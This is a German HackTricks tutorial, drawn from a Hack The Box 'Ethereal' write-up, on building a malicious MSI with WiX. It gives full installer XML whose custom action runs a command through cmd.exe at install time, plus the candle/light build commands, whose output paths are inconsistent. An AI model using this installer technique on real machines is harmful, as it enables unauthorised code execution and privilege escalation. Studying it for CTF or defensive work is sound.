# Bösartiges MSI erstellen und Root erhalten

{{#include ../../banners/hacktricks-training.md}}

Die Erstellung des MSI-Installers erfolgt mit wixtools, wobei speziell [wixtools](http://wixtoolset.org) verwendet wird. Es ist erwähnenswert, dass alternative MSI-Builder ausprobiert wurden, in diesem speziellen Fall jedoch nicht erfolgreich waren.<sup>[[1]](#references)</sup>

Für ein umfassendes Verständnis von Anwendungsbeispielen für wix MSI empfiehlt es sich, [diese Seite](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) zu konsultieren. Dort finden sich verschiedene Beispiele, die die Verwendung von wix MSI demonstrieren.<sup>[[2]](#references)</sup>

Das Ziel besteht darin, ein MSI zu erzeugen, das die lnk-Datei ausführt. Um dies zu erreichen, könnte der folgende XML-Code verwendet werden ([XML von hier](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Es ist wichtig zu beachten, dass das Package-Element Attribute wie InstallerVersion und Compressed enthält, die jeweils die Version des Installers angeben und festlegen, ob das Package komprimiert ist oder nicht.

Der Erstellungsprozess umfasst die Verwendung von candle.exe, einem Tool aus wixtools, um aus msi.xml ein wixobject zu generieren. Der folgende Befehl sollte ausgeführt werden:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Zusätzlich ist erwähnenswert, dass im Beitrag ein Bild bereitgestellt wird, das den Befehl und dessen Ausgabe darstellt. Sie können es als visuelle Orientierung heranziehen.<sup>[[1]](#references)</sup>

Darüber hinaus wird light.exe, ein weiteres Tool aus wixtools, verwendet, um die MSI-Datei aus dem wixobject zu erstellen. Der auszuführende Befehl lautet wie folgt:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Ähnlich wie beim vorherigen Befehl ist im Beitrag ein Bild enthalten, das den Befehl und seine Ausgabe veranschaulicht.<sup>[[1]](#references)</sup>

Bitte beachten Sie, dass diese Zusammenfassung zwar wertvolle Informationen bereitstellen soll, es jedoch empfehlenswert ist, den ursprünglichen Beitrag für umfassendere Details und genaue Anweisungen zu konsultieren.<sup>[[1]](#references)</sup>

## Referenzen

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (siehe auch [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
